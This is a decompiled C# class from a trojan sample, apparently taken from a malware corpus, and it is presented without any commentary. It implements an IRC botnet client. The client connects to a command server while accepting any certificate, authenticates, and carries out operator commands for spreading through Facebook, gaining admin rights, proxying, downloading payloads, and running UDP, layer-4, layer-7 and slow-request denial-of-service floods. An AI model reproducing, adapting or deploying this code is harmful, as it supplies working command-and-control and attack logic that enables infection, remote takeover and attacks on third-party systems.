// Decompiled with JetBrains decompiler
// Type: insomnia.Class31
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace insomnia
{
  internal class Class31
  {
    public static StreamWriter Field13;
    public static StreamReader Field12;
    public static TcpClient Field11;
    public static SslStream Field10;
    public static NetworkStream Field9;
    public static int Field8 = 0;
    public static bool Field7 = false;
    public static string Field6 = "";
    public static string Field5 = "";
    public static string Field4 = "";
    public static string Field3 = "";
    public static bool Field2 = false;
    public static string Field1 = Class26.Field8;

    public static void Method7(string[] A_0, string A_1, string A_2, int[] A_3, string A_4)
    {
      try
      {
        try
        {
          Class31.Field11 = new TcpClient(A_0[Class31.Field8], A_3[Class31.Field8]);
          RemoteCertificateValidationCallback userCertificateValidationCallback = new RemoteCertificateValidationCallback(Class31.Method2);
          Class31.Field10 = new SslStream((Stream) Class31.Field11.GetStream(), false, userCertificateValidationCallback);
          Class31.Field10.AuthenticateAsClient(A_0[0]);
          Class31.Field12 = new StreamReader((Stream) Class31.Field10);
          Class31.Field13 = new StreamWriter((Stream) Class31.Field10);
          Class31.Field13.AutoFlush = true;
        }
        catch
        {
          Class31.Field11 = new TcpClient(A_0[Class31.Field8], A_3[Class31.Field8]);
          Class31.Field9 = Class31.Field11.GetStream();
          Class31.Field12 = new StreamReader((Stream) Class31.Field9);
          Class31.Field13 = new StreamWriter((Stream) Class31.Field9);
          Class31.Field13.AutoFlush = true;
        }
        Class31.Field13.WriteLine("PASS " + Class26.Field9[Class31.Field8]);
        Class31.Field13.WriteLine("NICK " + Class26.Field18);
        Class31.Field13.WriteLine("USER " + Class26.Field19 + " 0 * :" + Class26.Field19);
        while (true)
        {
          if (!Class31.Field11.Connected)
          {
            Thread.Sleep(15000);
            Class31.Method1();
          }
          string[] strArray1 = new string[1]{ "" };
          string[] strArray2 = new string[1]{ "" };
          try
          {
            string A_0_1 = Class31.Field12.ReadLine();
            string[] strArray3 = A_0_1.Split(' ');
            A_0_1.Split(':');
            if (strArray3[1] == "332")
              Class33.Method23(strArray3[4].TrimStart(':'));
            if (strArray3[0] == "PING")
            {
              Class31.Field13.WriteLine("PONG " + strArray3[1]);
            }
            else
            {
              if (strArray3[0].Contains("001") || strArray3[1].Contains("001"))
                Class31.Field13.WriteLine("JOIN " + Class26.Field8 + " " + Class26.Field7);
              Class31.Field2 = true;
              Class31.Method5(A_0_1);
            }
          }
          catch
          {
          }
        }
      }
      catch
      {
        while (true)
        {
          try
          {
            Class31.Method6();
            if (Class39.Field4 || Class31.Field11.Connected)
              break;
            Thread.Sleep(10000);
            Class31.Method1();
            break;
          }
          catch
          {
            Thread.Sleep(10000);
          }
        }
      }
    }

    private static void Method6()
    {
      int num = Class26.Field10.Length - 1;
      if (Class31.Field8 == num)
        Class31.Field8 = 0;
      else
        ++Class31.Field8;
    }

    public static void Method5(string A_0)
    {
      try
      {
        string[] A_6 = A_0.Split(' ');
        string[] strArray = A_6[0].Split('@');
        string str1 = strArray[1];
        string str2 = A_6[1];
        Class31.Field1 = A_6[2].TrimStart(':');
        string A_0_1 = A_6[3].TrimStart(':');
        string str3 = strArray[0].Split(':')[1].Split('!')[0];
        if (Class31.Field1 == Class26.Field18)
          Class31.Field1 = str3;
        Class31.Field6 = A_6.Length <= 4 ? "" : A_6[4];
        Class31.Field5 = A_6.Length <= 5 ? "" : A_6[5];
        Class31.Field4 = A_6.Length <= 6 ? "" : A_6[6];
        Class31.Field3 = A_6.Length <= 7 ? "" : A_6[7];
        switch (str2)
        {
          case "KICK":
            Class31.Field13.WriteLine("JOIN " + Class26.Field8 + " " + Class26.Field7);
            break;
          case "KILL":
            Class31.Field13.Close();
            Class31.Field12.Close();
            Class31.Field11.Close();
            Class13.Field9.Start();
            break;
          case "TOPIC":
            if (Class26.Field14)
            {
              Class33.Method23(A_0_1);
              break;
            }
            break;
        }
        if (!(str1 == Class26.Field11) || !(str2 != "TOPIC"))
          return;
        Class31.Method4(A_0_1, Class31.Field1, Class31.Field6, Class31.Field5, Class31.Field4, Class31.Field3, A_6);
      }
      catch
      {
      }
    }

    public static void Method4(
      string A_0,
      string A_1,
      string A_2,
      string A_3,
      string A_4,
      string A_5,
      string[] A_6)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Class31.Class32 class32 = new Class31.Class32();
      // ISSUE: reference to a compiler-generated field
      class32.Field4 = A_2;
      // ISSUE: reference to a compiler-generated field
      class32.Field3 = A_3;
      // ISSUE: reference to a compiler-generated field
      class32.Field2 = A_4;
      // ISSUE: reference to a compiler-generated field
      class32.Field1 = A_6;
      switch (A_0)
      {
        case ".fbspread":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method8))
          {
            IsBackground = true
          }.Start();
          break;
        case ".getadmin":
          Class33.Method28();
          break;
        case ".acc":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method7))
          {
            IsBackground = true
          }.Start();
          break;
        case ".v":
          Class31.Method3(Class33.Method26(), A_1);
          break;
        case ".open":
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          Class33.Method22(class32.Field4, class32.Field3);
          break;
        case ".socks":
          Class33.Method15();
          break;
        case ".rm":
          Class33.Method14();
          break;
        case ".im":
          Class33.Method13();
          break;
        case ".ftp":
          Class33.Method12();
          break;
        case ".up":
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          Class33.Method8(class32.Field4, class32.Field3);
          break;
        case ".rc":
          Class31.Field13.WriteLine("QUIT :reconnecting");
          Class31.Field11.Close();
          Thread.Sleep(10000);
          Class31.Method1();
          break;
        case ".bk":
          // ISSUE: reference to a compiler-generated field
          Class33.Method11(class32.Field4);
          break;
        case ".j":
          // ISSUE: reference to a compiler-generated field
          Class31.Field13.WriteLine("JOIN " + class32.Field4);
          break;
        case ".p":
          // ISSUE: reference to a compiler-generated field
          Class31.Field13.WriteLine("PART " + class32.Field4);
          break;
        case ".sort":
          Class31.Field13.WriteLine("JOIN #" + Class39.Method17());
          break;
        case ".permsort":
          if (Class39.Method20() == "a")
          {
            Class31.Field13.WriteLine("JOIN #admins");
            break;
          }
          Class31.Field13.WriteLine("JOIN #users");
          break;
        case ".unsort":
          Class31.Field13.WriteLine("PART #" + Class39.Method17());
          break;
        case ".avinfo":
          Class33.Method10();
          break;
        case ".speedtest":
          // ISSUE: reference to a compiler-generated field
          Class33.Method9(class32.Field4);
          break;
        case ".dl":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method6))
          {
            IsBackground = true
          }.Start();
          break;
        case ".read":
          // ISSUE: reference to a compiler-generated field
          Class33.Method25(class32.Field4);
          break;
        case ".stop":
          Class33.Method16(true);
          break;
        case ".arme":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method5))
          {
            IsBackground = true
          }.Start();
          break;
        case ".udp":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method4))
          {
            IsBackground = true
          }.Start();
          break;
        case ".layer4":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method3))
          {
            IsBackground = true
          }.Start();
          break;
        case ".layer7":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method2))
          {
            IsBackground = true
          }.Start();
          break;
        case ".slow":
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(class32.Method1))
          {
            IsBackground = true
          }.Start();
          break;
        case ".m":
          // ISSUE: reference to a compiler-generated field
          if (class32.Field4 == "on")
            Class31.Field7 = true;
          // ISSUE: reference to a compiler-generated field
          if (!(class32.Field4 == "off"))
            break;
          Class31.Field7 = false;
          break;
      }
    }

    public static void Method3(string A_0, string A_1)
    {
      if (Class31.Field7)
        return;
      Class31.Field13.WriteLine("PRIVMSG " + A_1 + " :" + A_0);
    }

    private static bool Method2(
      object A_0,
      X509Certificate A_1,
      X509Chain A_2,
      SslPolicyErrors A_3)
    {
      return true;
    }

    public static void Method1() => Class31.Method7(Class26.Field10, Class26.Field8, Class26.Field7, Class26.Field6, Class26.Field11);
  }
}
